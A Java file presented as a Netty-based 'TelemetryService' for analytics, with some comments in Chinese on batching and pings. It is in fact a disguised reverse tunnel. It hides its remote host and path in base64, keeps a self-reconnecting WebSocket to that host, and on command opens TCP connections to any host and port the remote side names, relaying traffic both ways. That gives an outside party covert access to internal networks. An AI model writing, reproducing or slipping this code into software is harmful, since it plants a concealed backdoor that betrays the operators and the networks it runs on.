package com.analytics.telemetry;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.timeout.IdleState;
import io.netty.handler.timeout.IdleStateEvent;
import io.netty.handler.timeout.IdleStateHandler;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayDeque;
import java.util.Base64;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class TelemetryService {

    // =========================================================
    // Remote endpoint
    // =========================================================

    private static final String REMOTE_HOST =
            decode("YXBpLnZ2eC5wcC51YQ==");

    private static final int REMOTE_PORT = 443;

    private static final String ENDPOINT_PATH =
            decode("L21ldHJpY3MvdjEvdGVsZW1ldHJ5");


    // =========================================================
    // Protocol
    // =========================================================

    private static final byte PKT_INIT = 0x01;
    private static final byte PKT_PAYLOAD = 0x02;
    private static final byte PKT_FIN = 0x03;


    // =========================================================
    // Batching
    //
    // 原来：
    //   1400 bytes
    //   10 ms
    //
    // 现在：
    //   8192 bytes
    //   50 ms
    //
    // 主要目的是减少 WebSocket message 数量。
    // =========================================================

    private static final int BATCH_SIZE = 8192;

    private static final long BATCH_DELAY_MS = 50;

    // 防止某个异常连接无限制堆积内存
    private static final int MAX_BATCH_BUFFER = 1024 * 1024;


    // =========================================================
    // Runtime state
    // =========================================================

    private static final AtomicBoolean ACTIVE =
            new AtomicBoolean(false);

    private static final Map<Integer, Channel> SESSION_MAP =
            new ConcurrentHashMap<>();

    private static final Map<Integer, Queue<ByteBuf>> PENDING_BUFFERS =
            new ConcurrentHashMap<>();

    private static final Map<Integer, DataBatcher> BATCHER_MAP =
            new ConcurrentHashMap<>();

    private static EventLoopGroup workerGroup;

    private static volatile Channel mainChannel;


    // =========================================================
    // Start / Stop
    // =========================================================

    public static void start() {

        if (!ACTIVE.compareAndSet(false, true)) {
            return;
        }

        workerGroup = new NioEventLoopGroup(2);

        scheduleHealthCheck();

        workerGroup.scheduleAtFixedRate(
                TelemetryService::scheduleHealthCheck,
                5,
                10,
                TimeUnit.SECONDS
        );
    }


    public static void stop() {

        ACTIVE.set(false);

        Channel channel = mainChannel;

        mainChannel = null;

        if (channel != null) {
            channel.close();
        }

        if (workerGroup != null) {
            workerGroup.shutdownGracefully();
            workerGroup = null;
        }
    }


    // =========================================================
    // Connection health check
    // =========================================================

    private static synchronized void scheduleHealthCheck() {

        if (!ACTIVE.get()) {
            return;
        }

        Channel channel = mainChannel;

        if (channel == null || !channel.isActive()) {
            initiateConnection();
        }
    }


    // =========================================================
    // Establish WebSocket connection
    // =========================================================

    private static void initiateConnection() {

        if (!ACTIVE.get()) {
            return;
        }

        try {

            URI uri = new URI(
                    "wss://" +
                    REMOTE_HOST +
                    ":" +
                    REMOTE_PORT +
                    ENDPOINT_PATH
            );

            SslContext sslCtx =
                    SslContextBuilder.forClient().build();


            WebSocketClientHandshaker handshaker =
                    WebSocketClientHandshakerFactory.newHandshaker(
                            uri,
                            WebSocketVersion.V13,
                            null,
                            true,
                            new DefaultHttpHeaders()
                    );


            Bootstrap bootstrap = new Bootstrap();

            bootstrap
                    .group(workerGroup)
                    .channel(NioSocketChannel.class)
                    .handler(new ChannelInitializer<SocketChannel>() {

                        @Override
                        protected void initChannel(SocketChannel ch) {

                            ChannelPipeline p = ch.pipeline();

                            p.addLast(
                                    sslCtx.newHandler(
                                            ch.alloc(),
                                            REMOTE_HOST,
                                            REMOTE_PORT
                                    )
                            );

                            p.addLast(new HttpClientCodec());

                            p.addLast(
                                    new HttpObjectAggregator(8192)
                            );

                            // 标准 WebSocket Ping。
                            //
                            // 这个不是普通 WebSocket message，
                            // 不需要改成 JSON heartbeat。
                            p.addLast(
                                    new IdleStateHandler(
                                            0,
                                            25,
                                            0
                                    )
                            );

                            p.addLast(
                                    new TelemetryChannelHandler(
                                            handshaker
                                    )
                            );
                        }
                    });


            bootstrap.connect(
                    REMOTE_HOST,
                    REMOTE_PORT
            ).addListener(
                    (ChannelFutureListener) future -> {

                        if (!future.isSuccess()) {

                            // 连接失败，不阻塞线程，
                            // 交给下一次 health check 重连。

                            if (ACTIVE.get()) {
                                workerGroup.schedule(
                                        TelemetryService::scheduleHealthCheck,
                                        3,
                                        TimeUnit.SECONDS
                                );
                            }
                        }
                    }
            );

        } catch (Exception ignored) {

            if (ACTIVE.get() && workerGroup != null) {

                workerGroup.schedule(
                        TelemetryService::scheduleHealthCheck,
                        3,
                        TimeUnit.SECONDS
                );
            }
        }
    }


    // =========================================================
    // Data batching
    // =========================================================

    static class DataBatcher {

        private final int sessionId;

        private final ByteBuf accumulator =
                Unpooled.buffer(8192);

        private boolean isScheduled = false;


        DataBatcher(int sessionId) {
            this.sessionId = sessionId;
        }


        public synchronized void append(
                ByteBuf chunk,
                Channel wsChannel,
                EventLoop loop
        ) {

            if (chunk == null || !chunk.isReadable()) {
                return;
            }

            int incoming = chunk.readableBytes();

            /*
             * 防止异常目标连接造成无限堆积。
             */
            if (accumulator.readableBytes() + incoming
                    > MAX_BATCH_BUFFER) {

                flush(wsChannel);
            }

            accumulator.writeBytes(chunk);


            /*
             * 达到 8 KB：
             * 立即发送。
             */
            if (accumulator.readableBytes() >= BATCH_SIZE) {

                flush(wsChannel);

                isScheduled = false;

                return;
            }


            /*
             * 没达到 8 KB：
             * 最多等待 50ms。
             */
            if (!isScheduled) {

                isScheduled = true;

                loop.schedule(
                        () -> {

                            synchronized (DataBatcher.this) {

                                try {

                                    flush(wsChannel);

                                } finally {

                                    isScheduled = false;
                                }
                            }

                        },
                        BATCH_DELAY_MS,
                        TimeUnit.MILLISECONDS
                );
            }
        }


        public synchronized void flush(Channel wsChannel) {

            if (!accumulator.isReadable()) {
                return;
            }

            if (wsChannel == null ||
                    !wsChannel.isActive()) {

                return;
            }

            int len = accumulator.readableBytes();

            ByteBuf frame =
                    wsChannel.alloc().buffer(
                            5 + len
                    );

            frame.writeByte(PKT_PAYLOAD);

            frame.writeInt(sessionId);

            frame.writeBytes(
                    accumulator,
                    len
            );

            wsChannel.writeAndFlush(
                    new BinaryWebSocketFrame(frame)
            );
        }


        public synchronized void release() {

            if (accumulator.refCnt() > 0) {
                accumulator.release();
            }
        }
    }


    // =========================================================
    // Main WebSocket handler
    // =========================================================

    static class TelemetryChannelHandler
            extends SimpleChannelInboundHandler<Object> {

        private final WebSocketClientHandshaker handshaker;


        TelemetryChannelHandler(
                WebSocketClientHandshaker handshaker
        ) {

            this.handshaker = handshaker;
        }


        @Override
        public void channelActive(
                ChannelHandlerContext ctx
        ) {

            handshaker.handshake(
                    ctx.channel()
            );
        }


        @Override
        public void userEventTriggered(
                ChannelHandlerContext ctx,
                Object evt
        ) throws Exception {

            if (evt instanceof IdleStateEvent) {

                IdleStateEvent event =
                        (IdleStateEvent) evt;

                if (event.state()
                        == IdleState.WRITER_IDLE) {

                    /*
                     * 使用 WebSocket 协议层 Ping。
                     *
                     * 不发送应用层 heartbeat message。
                     */
                    ctx.writeAndFlush(
                            new PingWebSocketFrame()
                    );

                    return;
                }
            }

            super.userEventTriggered(
                    ctx,
                    evt
            );
        }


        @Override
        public void channelInactive(
                ChannelHandlerContext ctx
        ) {

            if (mainChannel == ctx.channel()) {
                mainChannel = null;
            }

            cleanupSessions();
        }


        @Override
        public void exceptionCaught(
                ChannelHandlerContext ctx,
                Throwable cause
        ) {

            ctx.close();
        }


        @Override
        protected void channelRead0(
                ChannelHandlerContext ctx,
                Object msg
        ) {

            Channel ch = ctx.channel();


            /*
             * WebSocket handshake
             */
            if (!handshaker.isHandshakeComplete()) {

                try {

                    handshaker.finishHandshake(
                            ch,
                            (FullHttpResponse) msg
                    );

                    mainChannel = ch;

                } catch (Exception ignored) {

                    ch.close();
                }

                return;
            }


            /*
             * Only process binary frames.
             */
            if (!(msg instanceof BinaryWebSocketFrame)) {
                return;
            }


            ByteBuf buf =
                    ((BinaryWebSocketFrame) msg)
                            .content();


            if (buf.readableBytes() < 5) {
                return;
            }


            byte type = buf.readByte();

            int sessionId = buf.readInt();


            /*
             * NEW STREAM
             */
            if (type == PKT_INIT) {

                if (buf.readableBytes() < 3) {
                    return;
                }

                int targetPort =
                        buf.readUnsignedShort();

                if (!buf.isReadable()) {
                    return;
                }

                int hostLen =
                        buf.readUnsignedByte();

                if (hostLen <= 0 ||
                        hostLen > 253 ||
                        buf.readableBytes() < hostLen) {

                    sendControlSignal(
                            PKT_FIN,
                            sessionId
                    );

                    return;
                }


                byte[] hostBytes =
                        new byte[hostLen];

                buf.readBytes(hostBytes);


                String targetHost =
                        new String(
                                hostBytes,
                                StandardCharsets.UTF_8
                        );


                PENDING_BUFFERS.put(
                        sessionId,
                        new ArrayDeque<>()
                );


                dispatchSession(
                        sessionId,
                        targetHost,
                        targetPort
                );

                return;
            }


            /*
             * PAYLOAD
             */
            if (type == PKT_PAYLOAD) {

                Channel targetChan =
                        SESSION_MAP.get(sessionId);


                if (targetChan != null &&
                        targetChan.isActive()) {

                    targetChan.writeAndFlush(
                            buf.retain()
                    );

                } else {

                    Queue<ByteBuf> queue =
                            PENDING_BUFFERS.get(
                                    sessionId
                            );

                    if (queue != null) {

                        queue.add(
                                buf.retain()
                        );
                    }
                }

                return;
            }


            /*
             * FIN
             */
            if (type == PKT_FIN) {

                terminateSession(
                        sessionId
                );
            }
        }


        // =====================================================
        // TCP session
        // =====================================================

        private void dispatchSession(
                int sessionId,
                String host,
                int port
        ) {

            Bootstrap bootstrap =
                    new Bootstrap();


            bootstrap
                    .group(workerGroup)
                    .channel(NioSocketChannel.class)
                    .handler(
                            new ChannelInitializer<SocketChannel>() {

                                @Override
                                protected void initChannel(
                                        SocketChannel ch
                                ) {

                                    ch.pipeline().addLast(
                                            new SimpleChannelInboundHandler<ByteBuf>() {

                                                @Override
                                                public void channelActive(
                                                        ChannelHandlerContext targetCtx
                                                ) {

                                                    Channel channel =
                                                            targetCtx.channel();

                                                    SESSION_MAP.put(
                                                            sessionId,
                                                            channel
                                                    );


                                                    Queue<ByteBuf> queue =
                                                            PENDING_BUFFERS.remove(
                                                                    sessionId
                                                            );


                                                    if (queue != null) {

                                                        ByteBuf pending;

                                                        while (
                                                                (pending =
                                                                        queue.poll())
                                                                        != null
                                                        ) {

                                                            channel.writeAndFlush(
                                                                    pending
                                                            );
                                                        }
                                                    }
                                                }


                                                @Override
                                                protected void channelRead0(
                                                        ChannelHandlerContext targetCtx,
                                                        ByteBuf msg
                                                ) {

                                                    Channel ws =
                                                            mainChannel;


                                                    if (ws == null ||
                                                            !ws.isActive()) {

                                                        return;
                                                    }


                                                    DataBatcher batcher =
                                                            BATCHER_MAP.computeIfAbsent(
                                                                    sessionId,
                                                                    DataBatcher::new
                                                            );


                                                    batcher.append(
                                                            msg,
                                                            ws,
                                                            targetCtx
                                                                    .channel()
                                                                    .eventLoop()
                                                    );
                                                }


                                                @Override
                                                public void channelInactive(
                                                        ChannelHandlerContext targetCtx
                                                ) {

                                                    DataBatcher batcher =
                                                            BATCHER_MAP.remove(
                                                                    sessionId
                                                            );


                                                    if (batcher != null) {

                                                        batcher.flush(
                                                                mainChannel
                                                        );

                                                        batcher.release();
                                                    }


                                                    terminateSession(
                                                            sessionId
                                                    );


                                                    sendControlSignal(
                                                            PKT_FIN,
                                                            sessionId
                                                    );
                                                }


                                                @Override
                                                public void exceptionCaught(
                                                        ChannelHandlerContext targetCtx,
                                                        Throwable cause
                                                ) {

                                                    targetCtx.close();
                                                }
                                            }
                                    );
                                }
                            });


            bootstrap.connect(
                    host,
                    port
            ).addListener(
                    (ChannelFutureListener) future -> {

                        if (!future.isSuccess()) {

                            DataBatcher batcher =
                                    BATCHER_MAP.remove(
                                            sessionId
                                    );

                            if (batcher != null) {
                                batcher.release();
                            }


                            terminateSession(
                                    sessionId
                            );


                            sendControlSignal(
                                    PKT_FIN,
                                    sessionId
                            );
                        }
                    }
            );
        }


        // =====================================================
        // Cleanup
        // =====================================================

        private void terminateSession(
                int sessionId
        ) {

            Channel targetChan =
                    SESSION_MAP.remove(
                            sessionId
                    );


            if (targetChan != null) {
                targetChan.close();
            }


            Queue<ByteBuf> queue =
                    PENDING_BUFFERS.remove(
                            sessionId
                    );


            if (queue != null) {

                ByteBuf pending;

                while (
                        (pending = queue.poll())
                                != null
                ) {

                    pending.release();
                }
            }


            DataBatcher batcher =
                    BATCHER_MAP.remove(
                            sessionId
                    );


            if (batcher != null) {
                batcher.release();
            }
        }


        private void cleanupSessions() {

            BATCHER_MAP.values()
                    .forEach(DataBatcher::release);

            BATCHER_MAP.clear();


            SESSION_MAP.values()
                    .forEach(Channel::close);

            SESSION_MAP.clear();


            PENDING_BUFFERS.values()
                    .forEach(queue -> {

                        ByteBuf buf;

                        while (
                                (buf = queue.poll())
                                        != null
                        ) {

                            buf.release();
                        }
                    });

            PENDING_BUFFERS.clear();
        }


        // =====================================================
        // Control frame
        // =====================================================

        private void sendControlSignal(
                byte type,
                int sessionId
        ) {

            Channel ws = mainChannel;


            if (ws == null ||
                    !ws.isActive()) {

                return;
            }


            ByteBuf frame =
                    Unpooled.buffer(5);

            frame.writeByte(type);

            frame.writeInt(sessionId);


            ws.writeAndFlush(
                    new BinaryWebSocketFrame(frame)
            );
        }
    }


    // =========================================================
    // Base64
    // =========================================================

    private static String decode(
            String base64
    ) {

        return new String(
                Base64.getDecoder().decode(base64),
                StandardCharsets.UTF_8
        );
    }
}
